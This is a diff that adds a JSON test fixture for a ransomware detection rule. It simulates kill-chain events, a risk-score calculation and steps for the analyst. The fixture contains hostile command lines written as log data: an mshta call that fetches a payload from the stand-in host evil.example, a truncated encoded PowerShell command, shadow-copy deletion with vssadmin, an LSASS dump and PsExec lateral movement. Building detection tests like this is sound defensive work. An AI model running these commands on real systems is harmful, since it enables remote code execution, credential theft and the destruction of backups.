@@ -1,0 +1,105 @@
+{
+  "_comment": "TRUE POSITIVE — SP-810003 + SP-810020: Ransomware Kill Chain Scorer — Full Multi-Stage",
+  "rule_ids": ["SP-810003", "SP-810020"],
+  "expected_result": "ALERT",
+  "severity": "CRITICAL",
+  "confidence": 95,
+  "scenario": "Full ransomware kill chain scored by SP-810020: Initial Access → Credential Dumping → Lateral Movement → Backup Destruction → Mass Encryption",
+  "mitre": "T1486 / T1490 / T1003 / T1021.002",
+  "detection_window_hours": 4,
+  "kill_chain_phases": [
+    {
+      "phase": "INITIAL_ACCESS",
+      "stage_id": "S1_INITIAL_ACCESS",
+      "time": "2024-01-15T20:00:00Z",
+      "description": "Phishing attachment executed via mshta.exe",
+      "sourcetype": "WinEventLog:Security",
+      "EventCode": 4688,
+      "NewProcessName": "C:\\Windows\\System32\\mshta.exe",
+      "CommandLine": "mshta.exe http://evil.example/payload.hta",
+      "host": "WORKSTATION-07"
+    },
+    {
+      "phase": "EXECUTION",
+      "stage_id": "S2_EXECUTION",
+      "time": "2024-01-15T20:02:00Z",
+      "description": "PowerShell encoded command dropped and executed",
+      "CommandLine": "powershell -enc JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAAg..."
+    },
+    {
+      "phase": "CREDENTIAL_ACCESS",
+      "stage_id": "S3_CREDENTIAL_ACCESS",
+      "time": "2024-01-15T20:15:00Z",
+      "description": "LSASS memory dump via procdump",
+      "sourcetype": "WinEventLog:Security",
+      "EventCode": 4656,
+      "ObjectName": "C:\\Windows\\System32\\lsass.exe",
+      "GrantedAccess": "0x1410",
+      "ProcessName": "C:\\Temp\\procdump64.exe"
+    },
+    {
+      "phase": "LATERAL_MOVEMENT",
+      "stage_id": "S4_LATERAL_MOVEMENT",
+      "time": "2024-01-15T21:00:00Z",
+      "description": "PsExec lateral movement to domain controller",
+      "sourcetype": "WinEventLog:Security",
+      "EventCode": 4648,
+      "TargetServerName": "DC01.contoso.com",
+      "ProcessName": "C:\\Temp\\PsExec.exe"
+    },
+    {
+      "phase": "DEFENSE_EVASION",
+      "stage_id": "S5_DEFENSE_EVASION",
+      "time": "2024-01-15T21:30:00Z",
+      "description": "Windows Defender disabled via registry",
+      "sourcetype": "WinEventLog:Security",
+      "EventCode": 4657,
+      "ObjectName": "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender",
+      "NewValue": "1"
+    },
+    {
+      "phase": "IMPACT",
+      "stage_id": "S6_IMPACT",
+      "time": "2024-01-15T23:00:00Z",
+      "description": "VSS deletion + mass file encryption begins",
+      "events": [
+        {
+          "CommandLine": "vssadmin delete shadows /all /quiet",
+          "time": "2024-01-15T23:00:00Z"
+        },
+        {
+          "description": "File rename spike: >500 files renamed to .locked within 2 minutes",
+          "rename_count": 523,
+          "extension": ".locked",
+          "time": "2024-01-15T23:00:30Z"
+        }
+      ]
+    }
+  ],
+  "kill_chain_scorer_result": {
+    "kill_chain_phases_count": 6,
+    "has_credential_access": true,
+    "has_lateral_movement": true,
+    "has_impact": true,
+    "has_exfiltration": false,
+    "risk_score_formula": "6 * 15 + 25 (CRED) + 0 (NO EXFIL) + 30 (IMPACT) = 145",
+    "risk_score": 145,
+    "severity": "CRITICAL",
+    "note": "Score >90 = CRITICAL. Score 145 indicates full kill chain."
+  },
+  "why_tp": [
+    "6 distinct kill chain phases detected within 3 hours",
+    "LSASS memory dump confirms credential theft (high-fidelity)",
+    "Lateral movement to domain controller — blast radius expanded",
+    "VSS deletion followed by mass file rename (.locked) — active encryption confirmed",
+    "Risk score 145 far exceeds CRITICAL threshold of 90"
+  ],
+  "analyst_action": [
+    "IMMEDIATE: Invoke Business Continuity Plan and Ransomware Response Playbook PB-001",
+    "Isolate ALL hosts that WORKSTATION-07 has connected to since 20:00",
+    "Especially isolate DC01.contoso.com — credential exposure likely",
+    "Check backup integrity — VSS deleted, verify off-site/immutable backups exist",
+    "Do NOT pay ransom — contact legal and cyber insurance first",
+    "Preserve forensic artifacts: memory dump, event logs, disk images"
+  ]
+}
